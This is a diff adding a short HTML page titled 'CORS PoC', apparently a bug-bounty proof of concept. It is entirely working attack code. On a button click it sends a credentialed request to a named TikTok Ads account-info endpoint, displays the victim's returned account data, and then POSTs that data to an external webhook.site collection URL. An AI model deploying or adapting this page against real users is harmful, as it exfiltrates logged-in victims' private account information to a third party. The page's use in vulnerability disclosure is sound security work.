@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <button id="poc">req</button>
+    <script>
+      document.getElementById('poc').addEventListener('click', function() {
+        const url = "https://ads.tiktok.com/CreativeOne/Client/ClientGetAccountInfo";
+        fetch(url, { credentials: "include" }) 
+          .then(r => r.json())
+          .then(data => {
+            alert("Received data:\n" + JSON.stringify(data, null, 2));
+            console.log("Got JSON:", data);
+            return fetch("https://webhook.site/98deafd7-4699-4590-a84c-3f33e2e2c6cd", {
+              method: "POST",
+              headers: { "Content-Type": "text/plain" },
+              body: JSON.stringify(data)
+            });
+          })
+          .then(response => {
+            console.log("Forwarded to webhook:", response.status);
+            alert("Sent");
+          })
+          .catch(err => {
+            console.error("Error:", err);
+            alert("Error: " + err);
+          });
+      });
+    </script>
+  </body>
+</html>
